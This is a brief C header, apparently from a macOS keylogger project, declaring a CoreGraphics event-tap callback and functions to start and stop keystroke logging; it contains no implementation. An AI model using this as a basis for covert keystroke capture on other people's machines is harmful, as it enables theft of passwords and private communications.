#ifndef __KEYLOGGER_H__
#define __KEYLOGGER_H__

#include <stdio.h>
#include <stdbool.h>
#include <CoreFoundation/CoreFoundation.h>
#include <CoreGraphics/CoreGraphics.h>

static inline CGEventRef CGEventCallback(CGEventTapProxy, CGEventType, CGEventRef, void *);
static inline void startKeylogger(void);
static inline void stopKeylogger(void);

#endif
